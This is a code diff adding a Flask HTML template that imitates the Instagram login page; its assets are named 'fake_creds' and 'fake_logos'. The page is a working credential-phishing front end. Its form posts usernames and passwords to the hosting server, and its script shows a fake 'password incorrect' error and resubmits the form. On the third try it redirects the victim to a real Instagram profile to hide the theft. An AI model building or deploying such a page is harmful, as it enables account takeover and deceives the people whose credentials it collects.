@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <style>
+        /* CSS for layout positioning */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(25, 1fr);
+            grid-template-rows: repeat(25, 6%);
+        }
+        .login {
+            justify-content: center; /* Align items horizontally */
+            display: flex;
+            grid-column: 14 / 15;
+            grid-row: 7 / 8;
+            flex-direction: row;
+        }
+        .sub-login {
+            flex-direction: column;
+            position: relative;
+        }
+        .bottom_bar {
+            align-items: center; /* Align items vertically */
+            justify-content: center; /* Align items horizontally */
+            grid-column: 14 / 15;
+            grid-row: 24 /25;
+        }
+        .form {
+            z-index: 2;
+            position: absolute;
+            bottom: 1%;
+            top: 130px;
+            left: 13%; /* Adjust left position as needed */
+            /*transform: translate(-50%, -50%);*/
+        }
+        #username {
+            height: 35px;
+            width: 265px;
+            padding: 0;
+            left: 4px;
+            top: 17px;
+            position: absolute;
+            border: 1px solid #dbdbdb;
+        }
+        #special_code {
+            height: 34px;
+            width: 265px;
+            padding: 0;
+            position: absolute;
+            top: 61px;
+            left: 4px;
+            border: 1px solid #dbdbdb;
+        }
+        .input {
+            color: #999;
+            font-size: 11px;
+            font-family: Verdana;
+            text-indent: 6px;
+            outline-color: #e7e7e7
+        }
+        .inputs input[type="text"]:focus {
+            border-color: #007bff; /* Change border color on focus */
+        }
+        .logo {
+            position: absolute;
+            left: -11.5px;
+        }
+        .submit {
+            background-color: #67b5fa;
+            height: 35px;
+            width: 270px;
+            left: 1px;
+            position: absolute;
+            border-radius: 5px;
+            border: none;
+            color: white;
+            font-size: 13px;
+            font-family: Tahoma;
+            font-weight: bold;
+        }
+        #error_message {
+            font-family: Tahoma;
+            font-size: 13px;
+            text-align: center;
+            position: absolute;
+            z-index: 3;
+            top: 220px;
+            left: 13px;
+            white-space: nowrap;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="grid">
+
+        <div class="login">
+
+            <div class="video">
+                <video autoplay muted playsinline>
+                    <source src="{{ url_for('static', filename='fake_phone_anim.mp4') }}" type="video/mp4">
+                    Your browser does not support the video tag.
+                </video>
+            </div>
+
+            <div class="sub-login">
+                <div class="logon">
+                    <img src="{{ url_for('static', filename='fake_creds.jpg') }}" alt="Your Image">
+                </div>
+                <!--onsubmit="return display_wrong_password()"-->
+                <div class="form">
+                    <form id="loginForm" method="post" action="/" class="inputs" id="loginForm">
+                        <label for="username"></label><br>
+                        <input type="text" id="username" id="username" name="username" class="input" placeholder="Phone number, username, or email"><br><br>
+                            
+                        <label for="special_code"></label><br>
+                        <input id="special_code" type="password" id="special_code" class="input" name="special_code" placeholder="Password"><br><br>
+                            
+                        <div id="submit_button" onclick="display_wrong_password()" style="cursor: pointer;">
+                            <input type="submit" value="Log in" class="submit">
+                        </div>
+
+                        <p id="error_message" style="display: none; color: red;" class="error-animation">Sorry, your password was incorrect. Please <br> double-check your password.</p>
+                    </form>
+                </div>
+
+                <div class="logo">
+                    <img src="{{ url_for('static', filename='fake_logos.png') }}" alt="Your Image">
+                </div>
+            </div>
+
+        </div>
+
+        <div class="bottom_bar">
+            <img src="{{ url_for('static', filename='fake_bottom_bar.png') }}" alt="Your Image">
+        </div>
+
+        <script>
+
+            var submissionCount = sessionStorage.getItem('submissionCount') || 0;
+
+            function display_wrong_password() {
+
+                setTimeout(function() {
+                    document.getElementById("loginForm").submit();
+                    }, 1000);
+
+                console.log('Submission count:', submissionCount);
+
+                if(submissionCount != 2) {
+                    submissionCount++; 
+                    sessionStorage.setItem('submissionCount', submissionCount);
+                } 
+                else if (submissionCount == 2) {
+                    window.location.href = "https://www.instagram.com/loribrandwritesandlifts/";
+                }
+                var errorMessage = document.getElementById("error_message");
+                errorMessage.style.display = "block";
+                event.preventDefault();
+            }
+        </script>
+    </div>
+</body>
+</html>
